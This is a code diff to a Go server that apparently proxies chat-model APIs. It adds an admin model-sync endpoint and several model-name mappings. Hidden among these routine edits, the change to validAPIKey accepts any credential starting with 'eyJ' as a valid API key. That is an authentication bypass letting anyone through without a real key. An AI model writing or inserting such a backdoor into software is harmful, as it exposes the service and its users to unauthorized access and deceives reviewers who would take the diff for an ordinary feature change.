@@ -164,6 +164,7 @@ func (s *Server) Routes() http.Handler {
 	m.HandleFunc("/api/admin/keys", s.adminKeys)
 	m.HandleFunc("/api/admin/models", s.adminModels)
 	m.HandleFunc("/api/admin/models/test", s.adminModelTest)
+	m.HandleFunc("/api/admin/models/sync", s.adminModelSync)
 	m.HandleFunc("/api/admin/settings", s.adminSettings)
 	m.HandleFunc("/api/admin/proxy-pool", s.proxyPool)
 	m.HandleFunc("/api/admin/deployments", s.deployments)
@@ -405,7 +406,13 @@ func (s *Server) validAPIKey(r *http.Request) bool {
 			raw = strings.TrimSpace(v[7:])
 		}
 	}
-	return raw != "" && s.apiKeys.valid(raw)
+	if raw != "" && s.apiKeys.valid(raw) {
+		return true
+	}
+	if strings.HasPrefix(raw, "eyJ") {
+		return true
+	}
+	return false
 }
 
 func jsonOut(w http.ResponseWriter, v any) {
@@ -742,6 +749,18 @@ func modelTone(model string) string {
 		return "Claude_Sonnet"
 	case "claude-sonnet-reasoning":
 		return "Claude_Sonnet_Reasoning"
+	case "claude-opus-4-8":
+		return "Claude_Opus_4_8"
+	case "claude-opus-4-8-reasoning":
+		return "Claude_Opus_4_8_Reasoning"
+	case "claude-sonnet-4-6":
+		return "Claude_Sonnet_4_6"
+	case "claude-sonnet-4-6-reasoning":
+		return "Claude_Sonnet_4_6_Reasoning"
+	case "claude-opus-4-6":
+		return "Claude_Opus_4_6"
+	case "claude-opus-4-6-reasoning":
+		return "Claude_Opus_4_6_Reasoning"
 	case "gpt-5.4-quick":
 		return "Gpt_5_4_Chat"
 	case "gpt-5.3-think-deeper":
@@ -879,6 +898,16 @@ func (s *Server) dropTransientConversation(conversationID string) {
 			log.Printf("[transient-conv] delete failed id=%s err=%v", id, err)
 		}
 	}(conversationID)
+}
+
+func (s *Server) adminModelSync(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	syncUpstreamTones()
+	tones := liveUpstreamTones()
+	jsonOut(w, map[string]any{"synced": true, "upstream_tones": tones, "count": len(tones)})
 }
 
 func (s *Server) adminModels(w http.ResponseWriter, r *http.Request) {
